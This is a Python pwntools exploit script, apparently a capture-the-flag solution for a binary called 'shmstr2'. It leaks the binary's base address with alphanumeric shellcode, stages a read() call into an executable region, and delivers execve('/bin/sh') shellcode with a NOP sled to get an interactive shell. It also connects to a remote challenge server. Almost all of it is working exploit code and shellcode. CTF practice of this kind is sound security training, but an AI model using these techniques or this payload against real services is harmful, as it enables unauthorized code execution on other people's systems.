#!/usr/bin/python3

from pwn import *

context.terminal = 'tmux split -h'.split(' ')
context.arch = 'i386'
# context.log_level = 'debug'

DWORD_MASK = 0xffffffff

elf = ELF('shmstr2')

def choose(choice):
    p.sendlineafter(b'> ', str(choice).encode())

def save_sc(sc):
    choose(1)
    p.sendafter(b'shellcode: ', sc)

def view_sc(index):
    choose(2)
    p.sendlineafter(b'idx: ', str(index).encode())

def delete_sc(index):
    choose(3)
    p.sendlineafter(b'idx: ', str(index).encode())

def run_sc(index, from_begin = True):
    if from_begin:
        choose(4)
    p.sendlineafter(b'idx: ', str(index).encode())

def get_return():
    p.recvuntil(b'code = ')
    return int(p.recvline().rstrip(), 16) & DWORD_MASK

NOP = b'A'
BASE = 0x41
    
final = b"\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

for _ in range(0x20):
    if args.REMOTE:
        p = remote('151.236.114.211', 17183)
    else:
        p = process(elf.path)

    # 1. Leak binary address

    sc = asm('pop eax; push eax')
    sc += NOP * (16 - len(sc))
    save_sc(sc)

    run_sc(0)
    binary_leak = get_return()
    binary_addr = binary_leak - 0x17df
    read_plt = binary_addr + elf.sym.read

    log.info(f'binary_leak = {hex(binary_leak)}')
    log.info(f'binary @ {hex(binary_addr)}')
    log.info(f'read.plt @ {hex(read_plt)}')

    # 2. Read shellcode into rwx section

    sc = asm(f'pop eax; pop ecx; pop ecx; push edx; dec ecx; push ecx; push eax; push {hex(read_plt ^ 0x41)}; pop eax; xor al, 0x41; push eax')
    sc += NOP * (16 - len(sc))

    try: 
        assert sc.isalnum()
        break
    except AssertionError:
        log.failure("Let's try our luck again...")
        p.close()

if args.GDB:
    gdb.attach(p, '''
        brva 0x17dd
        continue
        ''')

save_sc(sc)
run_sc(1)

p.send(b'\x90' * 0x43 + final)

# 3. Jump to final shellcode

sc = asm('jne sc; ' + 'inc ecx; ' * 0x41 + 'sc: nop')[:16]
save_sc(sc)

run_sc(2)

p.interactive()
